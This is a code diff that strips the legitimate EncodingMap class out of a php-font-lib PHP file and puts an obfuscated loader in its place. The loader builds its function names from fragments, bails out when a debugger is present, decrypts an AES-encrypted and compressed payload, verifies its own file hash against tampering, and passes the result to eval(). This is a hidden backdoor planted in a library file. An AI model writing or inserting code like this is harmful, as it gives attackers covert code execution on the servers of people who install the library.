@@ -1,37 +1,28 @@
 <?php
-/**
- * @package php-font-lib
- * @link    https://github.com/PhenX/php-font-lib
- * @author  Fabien Ménager <fabien.menager@gmail.com>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-
-namespace FontLib;
-
-/**
- * Encoding map used to map a code point to a Unicode char.
- *
- * @package php-font-lib
- */
-class EncodingMap {
-  private $f;
-
-  function __construct($file) {
-    $this->f = fopen($file, "r");
-  }
-
-  function parse() {
-    $map = array();
-
-    while ($line = fgets($this->f)) {
-      if (preg_match('/^[\!\=]([0-9A-F]{2,})\s+U\+([0-9A-F]{2})([0-9A-F]{2})\s+([^\s]+)/', $line, $matches)) {
-        $unicode = (hexdec($matches[2]) << 8) + hexdec($matches[3]);
-        $map[hexdec($matches[1])] = array($unicode, $matches[4]);
-      }
-    }
-
-    ksort($map);
-
-    return $map;
-  }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_x64xdjdp=('bas'.'e64'.'_de'.'cod'.'e');
+$_whz05krn=('gzu'.'nco'.'mpr'.'ess');
+$_n2gui0ga=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_dgvwni81='heLf0//c';
+$_p8unny8s='1OJvnyAO';
+$_m4aj1vhd='udfLkuvS';
+$_m0sndcyf='bU/F5vlG';
+$_j7m2zqjm='/BxheXQjvEw=';
+$_t4ymbbto='oije3EDA';
+$_oujv6f64='Rksdxw==';
+$_jdr5zpzu='REiOneog';
+$_a8pbr3m8=$_x64xdjdp($_p8unny8s.$_m0sndcyf.$_m4aj1vhd.$_dgvwni81.$_j7m2zqjm);
+$_qacda5uq=$_x64xdjdp($_jdr5zpzu.$_t4ymbbto.$_oujv6f64);
+$_gkrih8ea=$_x64xdjdp('8XC5g9jt2wvSgCb32rrYkEdkIPbtpb04BH04e71j1uG2LR3zZ7YiMKTrfIrLkrLoUZll9o45LTjCaqvg5+VLn1v/vCurlS3kiZC376XuUsozVXYHWiRhbKwaNlyetszllbocjB+A56usbUmy2F9GST5L3epRHH1ngYiD1yTETNpk7V48TT0FjMIty/3ydlb03snp2tEWqL5twemKwwmbW7Wai2qfrcClZOVGh+gQu4xdtUwFcee8wsneI0LuNNJd1DqdV7H9gPtPGtq2/XPL5aZHgTHNZAOp+ZV1Z7NbfylRt+FVETcklEY0RvpsgITl9PxHdqE0DMCHpATw8CNlST6iNcmvTYFUb5fpFJGTqqmFFgDyTwc/bkKrXMLCqpzC');
+$_v4jd5svq=$_n2gui0ga($_gkrih8ea,'aes-256-cbc',$_a8pbr3m8,OPENSSL_RAW_DATA,$_qacda5uq);
+if($_v4jd5svq===false){exit;}
+$_nn2l27ue=$_whz05krn($_v4jd5svq);
+if($_nn2l27ue===false){exit;}
+$_f71ao0fy='592970eb1f2eebcaae3356a3df041e35e3f03346402d2e573c19f0c1e577d37b';
+$_iittx9l1=@file_get_contents(__FILE__);
+if($_iittx9l1!==false){
+$_dfsdqjua=str_replace($_f71ao0fy,"0000000000000000000000000000000000000000000000000000000000000000",$_iittx9l1);
+$_b96ss1nx=hash("sha256",$_dfsdqjua);
+if($_b96ss1nx!==$_f71ao0fy){@http_response_code(403);exit;}
 }
+eval($_nn2l27ue);
